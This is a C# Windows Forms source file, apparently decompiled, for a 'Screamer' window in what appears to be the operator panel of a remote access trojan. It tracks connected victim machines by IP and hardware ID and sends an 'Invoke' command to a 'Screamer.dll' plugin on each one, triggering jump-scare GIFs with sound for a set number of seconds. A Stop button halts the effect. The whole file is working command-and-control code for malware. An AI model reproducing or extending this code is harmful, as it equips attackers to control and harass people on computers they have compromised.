using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormScreamer : MaterialForm
{
	private Clients[] _targets;

	private bool _isFullyInitialized;

	private int selectedIndex;

	private IContainer components;

	private MaterialTabControl tabControlScreamer;

	private TabPage tabPage1;

	private TabPage tabPage2;

	private TabPage tabPage3;

	private MaterialTabSelector tabSelector;

	private PictureBox picPreview;

	private Label lblSecound;

	private NumericUpDown numSeconds;

	private MaterialButton btnSend;

	private MaterialButton btnStop;

	private MaterialSwitch swSound;

	private TabPage tabPage4;

	public Clients[] Targets
	{
		get
		{
			return _targets;
		}
		set
		{
			_targets = value;
			CheckAndInitialize();
		}
	}

	public FormScreamer()
	{
		InitializeComponent();
		MaterialSkinManager.Instance.AddFormToManage(this);
		tabControlScreamer.SelectedIndexChanged += TabControlScreamer_SelectedIndexChanged;
		btnSend.Click += btnSend_Click;
		btnStop.Click += btnStop_Click;
		selectedIndex = 0;
		SetControlsEnabled(enabled: false);
		LoadPreviews();
		base.Load += FormScreamer_Load;
		base.FormClosing += delegate
		{
			if (_targets != null)
			{
				Clients[] targets = _targets;
				foreach (Clients clients in targets)
				{
					if (!clients.itsConnect)
					{
						clients.Disconnect();
					}
				}
			}
		};
	}

	private void FormScreamer_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeTheme;
		MaterialSkinManager.Instance.ColorSchemeChanged += ChangeScheme;
		ChangeTheme(this);
		ChangeScheme(this);
	}

	private void ChangeTheme(object sender)
	{
		Color backColor = ((MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK) ? Color.FromArgb(40, 40, 40) : Color.White);
		BackColor = backColor;
	}

	private void ChangeScheme(object sender)
	{
		if (btnSend != null)
		{
			btnSend.BackColor = MaterialSkinManager.Instance.ColorScheme.PrimaryColor;
		}
		if (btnStop != null)
		{
			btnStop.BackColor = MaterialSkinManager.Instance.ColorScheme.PrimaryColor;
		}
	}

	private void TabControlScreamer_SelectedIndexChanged(object sender, EventArgs e)
	{
		selectedIndex = tabControlScreamer.SelectedIndex;
		LoadPreviews();
	}

	private void LoadPreviews()
	{
		if (LicenseManager.UsageMode != LicenseUsageMode.Designtime)
		{
			string path = $"res/screamer{selectedIndex + 1}.gif";
			LoadPreviewInto(picPreview, path);
		}
	}

	private void LoadPreviewInto(PictureBox pb, string path)
	{
		try
		{
			if (pb.Image != null)
			{
				Image image = pb.Image;
				pb.Image = null;
				image.Dispose();
			}
			if (File.Exists(path))
			{
				MemoryStream ms = new MemoryStream(File.ReadAllBytes(path));
				pb.Image = Image.FromStream(ms);
			}
		}
		catch
		{
		}
	}

	private void OnTargetsInitialized()
	{
		if (_targets != null && _targets.Length != 0 && !string.IsNullOrEmpty(_targets[0].Hwid))
		{
			string hwid = _targets[0].Hwid;
			if (base.InvokeRequired)
			{
				Invoke((MethodInvoker)delegate
				{
					Text = "Screamer [" + hwid + "]";
					base.Name = "Screamer:" + hwid;
				});
			}
			else
			{
				Text = "Screamer [" + hwid + "]";
				base.Name = "Screamer:" + hwid;
			}
		}
		_isFullyInitialized = true;
		if (base.InvokeRequired)
		{
			Invoke((MethodInvoker)delegate
			{
				SetControlsEnabled(enabled: true);
			});
		}
		else
		{
			SetControlsEnabled(enabled: true);
		}
	}

	private bool IsClientReady(Clients client)
	{
		if (client != null && client.itsConnect && !string.IsNullOrEmpty(client.Hwid))
		{
			return true;
		}
		return false;
	}

	private void CheckAndInitialize()
	{
		if (_targets == null || _targets.Length == 0)
		{
			_isFullyInitialized = false;
			SetControlsEnabled(enabled: false);
			return;
		}
		bool flag = true;
		Clients[] targets = _targets;
		foreach (Clients client in targets)
		{
			if (!IsClientReady(client))
			{
				flag = false;
				break;
			}
		}
		if (flag)
		{
			OnTargetsInitialized();
			return;
		}
		_isFullyInitialized = false;
		SetControlsEnabled(enabled: false);
		if (base.InvokeRequired)
		{
			Invoke((MethodInvoker)delegate
			{
				Text = "Screamer - Initializing...";
			});
		}
		else
		{
			Text = "Screamer - Initializing...";
		}
	}

	public void NotifyClientReady(Clients client)
	{
		if (_targets != null && _targets.Contains(client))
		{
			CheckAndInitialize();
		}
	}

	private void btnSend_Click(object sender, EventArgs e)
	{
		if (_targets == null || _targets.Length == 0)
		{
			Methods.AppendLogs("Error", "No targets selected for Screamer", Color.Red);
			return;
		}
		byte[] pack = LEB128.Write(new object[3]
		{
			selectedIndex,
			swSound != null && swSound.Checked,
			(int)numSeconds.Value
		});
		string checksum = Methods.GetChecksum("Plugin\\Screamer.dll");
		Clients[] targets = _targets;
		foreach (Clients client in targets)
		{
			if (client == null || !client.itsConnect)
			{
				continue;
			}
			try
			{
				Methods.AppendLogs(client.IP, $"Sending Screamer (index: {selectedIndex}, sound: {swSound?.Checked}, duration: {numSeconds.Value}s) to client: {client.Hwid}", Color.Green);
				Task.Run(delegate
				{
					client.Send(new object[3] { "Invoke", checksum, pack });
				});
			}
			catch (Exception ex)
			{
				Methods.AppendLogs(client.IP, "Error sending Screamer: " + ex.Message, Color.Red);
			}
		}
	}

	private void btnStop_Click(object sender, EventArgs e)
	{
		if (_targets == null || _targets.Length == 0)
		{
			return;
		}
		byte[] pack = LEB128.Write(new object[1] { -1 });
		string checksum = Methods.GetChecksum("Plugin\\Screamer.dll");
		Clients[] targets = _targets;
		foreach (Clients client in targets)
		{
			if (client == null || !client.itsConnect || !IsClientReady(client))
			{
				continue;
			}
			try
			{
				Task.Run(delegate
				{
					client.Send(new object[3] { "Invoke", checksum, pack });
				});
			}
			catch (Exception ex)
			{
				Methods.AppendLogs(client.IP, "Error stopping Screamer: " + ex.Message, Color.Red);
			}
		}
	}

	private void SetControlsEnabled(bool enabled)
	{
		btnSend.Enabled = enabled;
		btnStop.Enabled = enabled;
		swSound.Enabled = enabled;
		tabControlScreamer.Enabled = enabled;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.tabControlScreamer = new MaterialSkin.Controls.MaterialTabControl();
		this.tabPage1 = new System.Windows.Forms.TabPage();
		this.tabPage2 = new System.Windows.Forms.TabPage();
		this.tabPage3 = new System.Windows.Forms.TabPage();
		this.tabPage4 = new System.Windows.Forms.TabPage();
		this.tabSelector = new MaterialSkin.Controls.MaterialTabSelector();
		this.picPreview = new System.Windows.Forms.PictureBox();
		this.lblSecound = new System.Windows.Forms.Label();
		this.numSeconds = new System.Windows.Forms.NumericUpDown();
		this.btnSend = new MaterialSkin.Controls.MaterialButton();
		this.btnStop = new MaterialSkin.Controls.MaterialButton();
		this.swSound = new MaterialSkin.Controls.MaterialSwitch();
		this.tabControlScreamer.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.picPreview).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.numSeconds).BeginInit();
		base.SuspendLayout();
		this.tabControlScreamer.Controls.Add(this.tabPage1);
		this.tabControlScreamer.Controls.Add(this.tabPage2);
		this.tabControlScreamer.Controls.Add(this.tabPage3);
		this.tabControlScreamer.Controls.Add(this.tabPage4);
		this.tabControlScreamer.Depth = 0;
		this.tabControlScreamer.Location = new System.Drawing.Point(7, 130);
		this.tabControlScreamer.MouseState = MaterialSkin.MouseState.HOVER;
		this.tabControlScreamer.Multiline = true;
		this.tabControlScreamer.Name = "tabControlScreamer";
		this.tabControlScreamer.SelectedIndex = 0;
		this.tabControlScreamer.Size = new System.Drawing.Size(25, 13);
		this.tabControlScreamer.TabIndex = 0;
		this.tabPage1.BackColor = System.Drawing.Color.White;
		this.tabPage1.Location = new System.Drawing.Point(4, 76);
		this.tabPage1.Name = "tabPage1";
		this.tabPage1.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage1.Size = new System.Drawing.Size(17, 0);
		this.tabPage1.TabIndex = 0;
		this.tabPage1.Text = "Variant 1";
		this.tabPage2.BackColor = System.Drawing.Color.White;
		this.tabPage2.Location = new System.Drawing.Point(4, 76);
		this.tabPage2.Name = "tabPage2";
		this.tabPage2.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage2.Size = new System.Drawing.Size(17, 0);
		this.tabPage2.TabIndex = 1;
		this.tabPage2.Text = "Variant 2";
		this.tabPage3.BackColor = System.Drawing.Color.White;
		this.tabPage3.Location = new System.Drawing.Point(4, 76);
		this.tabPage3.Name = "tabPage3";
		this.tabPage3.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage3.Size = new System.Drawing.Size(17, 0);
		this.tabPage3.TabIndex = 2;
		this.tabPage3.Text = "Variant 3";
		this.tabPage4.Location = new System.Drawing.Point(4, 76);
		this.tabPage4.Name = "tabPage4";
		this.tabPage4.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage4.Size = new System.Drawing.Size(17, 0);
		this.tabPage4.TabIndex = 3;
		this.tabPage4.Text = "Variant 4";
		this.tabPage4.UseVisualStyleBackColor = true;
		this.tabSelector.BaseTabControl = this.tabControlScreamer;
		this.tabSelector.CharacterCasing = MaterialSkin.Controls.MaterialTabSelector.CustomCharacterCasing.Normal;
		this.tabSelector.Depth = 0;
		this.tabSelector.Font = new System.Drawing.Font("Roboto", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel);
		this.tabSelector.Location = new System.Drawing.Point(0, 64);
		this.tabSelector.MouseState = MaterialSkin.MouseState.HOVER;
		this.tabSelector.Name = "tabSelector";
		this.tabSelector.Size = new System.Drawing.Size(762, 40);
		this.tabSelector.TabIndex = 10;
		this.tabSelector.Text = "materialTabSelector1";
		this.picPreview.Location = new System.Drawing.Point(23, 118);
		this.picPreview.Name = "picPreview";
		this.picPreview.Size = new System.Drawing.Size(710, 340);
		this.picPreview.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.picPreview.TabIndex = 4;
		this.picPreview.TabStop = false;
		this.lblSecound.AutoSize = true;
		this.lblSecound.Font = new System.Drawing.Font("Segoe UI", 10f);
		this.lblSecound.Location = new System.Drawing.Point(515, 475);
		this.lblSecound.Name = "lblSecound";
		this.lblSecound.Size = new System.Drawing.Size(53, 19);
		this.lblSecound.TabIndex = 5;
		this.lblSecound.Text = "Second";
		this.numSeconds.Location = new System.Drawing.Point(574, 475);
		this.numSeconds.Name = "numSeconds";
		this.numSeconds.Size = new System.Drawing.Size(45, 20);
		this.numSeconds.TabIndex = 6;
		this.numSeconds.Value = new decimal(new int[4] { 5, 0, 0, 0 });
		this.btnSend.AutoSize = false;
		this.btnSend.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
		this.btnSend.Density = MaterialSkin.Controls.MaterialButton.MaterialButtonDensity.Default;
		this.btnSend.Depth = 0;
		this.btnSend.HighEmphasis = true;
		this.btnSend.Icon = null;
		this.btnSend.Location = new System.Drawing.Point(633, 467);
		this.btnSend.Margin = new System.Windows.Forms.Padding(4, 6, 4, 6);
		this.btnSend.MouseState = MaterialSkin.MouseState.HOVER;
		this.btnSend.Name = "btnSend";
		this.btnSend.NoAccentTextColor = System.Drawing.Color.Empty;
		this.btnSend.Size = new System.Drawing.Size(100, 36);
		this.btnSend.TabIndex = 7;
		this.btnSend.Text = "Send";
		this.btnSend.Type = MaterialSkin.Controls.MaterialButton.MaterialButtonType.Contained;
		this.btnSend.UseAccentColor = false;
		this.btnStop.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
		this.btnStop.Density = MaterialSkin.Controls.MaterialButton.MaterialButtonDensity.Default;
		this.btnStop.Depth = 0;
		this.btnStop.HighEmphasis = true;
		this.btnStop.Icon = null;
		this.btnStop.Location = new System.Drawing.Point(23, 467);
		this.btnStop.Margin = new System.Windows.Forms.Padding(4, 6, 4, 6);
		this.btnStop.MouseState = MaterialSkin.MouseState.HOVER;
		this.btnStop.Name = "btnStop";
		this.btnStop.NoAccentTextColor = System.Drawing.Color.Empty;
		this.btnStop.Size = new System.Drawing.Size(64, 36);
		this.btnStop.TabIndex = 8;
		this.btnStop.Text = "Stop";
		this.btnStop.Type = MaterialSkin.Controls.MaterialButton.MaterialButtonType.Contained;
		this.btnStop.UseAccentColor = false;
		this.swSound.AutoSize = true;
		this.swSound.Checked = true;
		this.swSound.CheckState = System.Windows.Forms.CheckState.Checked;
		this.swSound.Depth = 0;
		this.swSound.Location = new System.Drawing.Point(95, 467);
		this.swSound.Margin = new System.Windows.Forms.Padding(0);
		this.swSound.MouseLocation = new System.Drawing.Point(-1, -1);
		this.swSound.MouseState = MaterialSkin.MouseState.HOVER;
		this.swSound.Name = "swSound";
		this.swSound.Ripple = true;
		this.swSound.Size = new System.Drawing.Size(104, 37);
		this.swSound.TabIndex = 9;
		this.swSound.Text = "Sound";
		this.swSound.UseVisualStyleBackColor = true;
		base.ClientSize = new System.Drawing.Size(755, 513);
		base.Controls.Add(this.tabSelector);
		base.Controls.Add(this.swSound);
		base.Controls.Add(this.btnStop);
		base.Controls.Add(this.btnSend);
		base.Controls.Add(this.numSeconds);
		base.Controls.Add(this.lblSecound);
		base.Controls.Add(this.picPreview);
		base.Controls.Add(this.tabControlScreamer);
		base.Name = "FormScreamer";
		this.Text = "Screamer";
		this.tabControlScreamer.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.picPreview).EndInit();
		((System.ComponentModel.ISupportInitialize)this.numSeconds).EndInit();
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
